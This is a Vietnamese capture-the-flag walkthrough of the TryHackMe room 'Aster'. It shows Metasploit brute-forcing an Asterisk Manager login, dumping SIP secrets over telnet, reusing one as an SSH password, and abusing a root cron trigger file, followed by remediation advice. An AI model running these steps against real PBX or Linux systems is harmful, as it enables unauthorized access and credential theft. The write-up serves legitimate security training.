@@ -1,0 +1,150 @@
+---
+title: 'Aster'
+description: 'Một file .pyc decompile gợi ý một PBX Asterisk; brute-force Asterisk Manager và đọc SIP users làm lộ một mật khẩu SSH, và một cron root chạy một class Java theo file kích hoạt bị lợi dụng để ghi ra root flag.'
+date: 2026-02-26
+platform: tryhackme
+room: 'Aster'
+roomUrl: 'https://tryhackme.com/room/aster'
+difficulty: medium
+tags:
+  - 'reverse-engineering'
+  - 'password-cracking'
+  - 'network-protocol'
+  - 'linux'
+  - 'privesc'
+  - 'scheduled-tasks'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Aster" trên TryHackMe. Một file Python đã biên dịch trên web server decompile ra một gợi ý trỏ tới Asterisk, một PBX mã nguồn mở. Ta brute-force Asterisk Manager Interface, đọc SIP users để khôi phục một mật khẩu SSH, và kết thúc bằng một cron root chạy một class Java mỗi khi một file kích hoạt tồn tại — ta dùng nó để root flag được ghi ra hộ._
+
+> Aster là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Cả hai flag và mật khẩu khôi phục được hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Web server cung cấp một `.pyc`; decompile nó (`uncompyle6`) và giải các chuỗi hex ra một gợi ý nêu “open source framework for building communications” → đó là **Asterisk** trên cổng 5038 (Asterisk Call Manager) → brute login AMI (`admin`) bằng Metasploit → đăng nhập qua telnet và chạy `sip show users` để đọc SIP secret của **harry** → SSH thành **harry** (user flag) → home của harry có `Example_Root.jar`; decompile cho thấy một cron root ghi root flag vào `/home/harry/root.txt` **mỗi khi** **`/tmp/flag.dat`** **tồn tại** → `touch /tmp/flag.dat`, chờ một phút, đọc **root flag**.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy SSH, một web server, và — dấu hiệu tố cáo — Asterisk Call Manager cùng các cổng liên quan VoIP:
+
+```text
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu
+80/tcp   open  http        Apache 2.4.18   # Aster CTF
+1720/tcp open  h323q931?
+2000/tcp open  cisco-sccp?
+5038/tcp open  asterisk    Asterisk Call Manager 5.0.2
+```
+
+### **Lỗ hổng**
+
+Aster là một chuỗi dịch vụ đặc quyền bị phơi bày, bảo vệ yếu. Web server làm lộ một file Python đã biên dịch trao cho ta một gợi ý; Asterisk Manager Interface chấp nhận một mật khẩu yếu và cho phép một user đã xác thực đọc secret của mọi SIP peer ở dạng cleartext; và một cron root tin tưởng một file kích hoạt ai cũng ghi được.
+
+<Callout type="insight">
+
+Asterisk Manager Interface là điểm then chốt. Một khi brute được một manager login, `sip show users` in ra mọi SIP peer **kèm secret dạng plaintext** — và ở đây secret của một SIP user được dùng lại làm mật khẩu SSH Linux. Một cổng quản lý tổng đài mà phần lớn người ta bỏ qua lại là một kho credential đầy đủ nếu login của nó yếu.
+
+</Callout>
+
+### **Bước 1 — decompile .pyc → nhận diện Asterisk**
+
+Tải `.pyc` mà web app phục vụ và decompile nó; các chuỗi hex nhúng giải ra một gợi ý:
+
+```text
+uncompyle6 output.pyc
+# hex -> "Good job, user 'admin' the open source framework for building communications, installed in the server."
+```
+
+Gợi ý đó nêu manager user `admin` và chỉ thẳng vào Asterisk (cổng 5038).
+
+### **Bước 2 — brute Asterisk Manager → đọc SIP secret**
+
+Module `auxiliary/voip/asterisk_login` của Metasploit brute-force mật khẩu manager:
+
+```text
+msf > use auxiliary/voip/asterisk_login
+msf > set USERNAME admin
+msf > set RHOSTS $IP
+msf > run      # admin : <redacted>
+```
+
+Đăng nhập qua telnet và liệt kê SIP users:
+
+```text
+telnet $IP 5038
+# Action: Login / Username: admin / Secret: <redacted>
+# Action: Command / Command: sip show users
+# -> harry   <redacted>   (SIP secret)
+```
+
+### **Bước 3 — SSH thành harry (user flag)**
+
+SIP secret của `harry` được dùng lại cho SSH:
+
+```text
+ssh harry@$IP
+harry@ubuntu:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 4 — cron root + file kích hoạt → root flag**
+
+Home của `harry` chứa `Example_Root.jar`. Unzip nó, kéo `.class` về máy tấn công và decompile (Ghidra): nó ghi root flag vào `/home/harry/root.txt` **chỉ khi** **`/tmp/flag.dat`** **tồn tại**. `/etc/crontab` xác nhận một job root chạy file Java thật mỗi phút:
+
+```text
+# /etc/crontab
+*  *  * * *  root  cd /root/java/ && bash run.sh
+```
+
+Nên tạo file kích hoạt và chờ một nhịp — Java chạy bởi root ghi flag vào home đọc được của harry:
+
+```text
+harry@ubuntu:~$ echo "go" > /tmp/flag.dat
+# ~1 min later, root.txt appears, owned by root but world-readable:
+harry@ubuntu:~$ cat root.txt
+THM{<redacted>}
+```
+
+Lưu ý: cách này khôi phục **root flag** qua một tiến trình chạy bởi root; đó là một lần ghi file đặc quyền được kích hoạt bởi một điều kiện kẻ tấn công kiểm soát được, không phải một root shell tương tác. Một shell đầy đủ sẽ cần ghi được vào script của cron hoặc file Java trong `/root/java/`, điều không được thực hiện ở đây.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Cao — CVSS 3.1 \~8.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`). Một mật khẩu Asterisk Manager yếu phơi bày secret cleartext của mọi SIP peer, một trong số đó được dùng lại cho SSH — truy cập tương tác từ xa dưới một user thật. Một cron root hành động theo một file kích hoạt ai cũng ghi được sau đó làm lộ dữ liệu thuộc root cho một user quyền thấp, cho thấy một lỗi thiết kế dịch vụ đặc quyền mà chỉ một thay đổi nhỏ sẽ biến thành root đầy đủ.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Siết Asterisk Manager Interface:** secret `manager.conf` mạnh, duy nhất, bind AMI vào loopback hoặc chỉ các host quản lý được tin cậy, và không dùng lại SIP secret làm mật khẩu OS.
+- **Không phơi bày mã nguồn đã biên dịch trên web root** — `.pyc` đã làm lộ gợi ý đầu tiên.
+- **Sửa thiết kế cron/trigger.** Một job root không được hành động theo một đường ai cũng ghi được (`/tmp/flag.dat`); xác minh input, chạy với quyền tối thiểu, và đừa các script đặc quyền cùng trigger của chúng khỏi các vị trí user ghi được.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Decompile mọi thứ.** Một `.pyc` hay `.jar` thường trao cho bạn bước kế tiếp miễn phí — ở đây là dịch vụ cần nhắm và trigger để privesc.
+- **Cổng tổng đài là kho credential.** Một AMI login yếu cộng `sip show users` là một lần dump mật khẩu cleartext.
+- **Dùng lại credential bắc cầu giữa các dịch vụ.** Một SIP secret trở thành một login SSH.
+- **Để ý cái mà cron root tin tưởng.** Một file kích hoạt ai cũng ghi được là một ranh giới đặc quyền.
+
+Aster là lời nhắc rằng các cổng hạ tầng “nhàm chán” — một giao diện quản lý PBX — có thể là đường vào dễ nhất. Cảm ơn đã đọc.
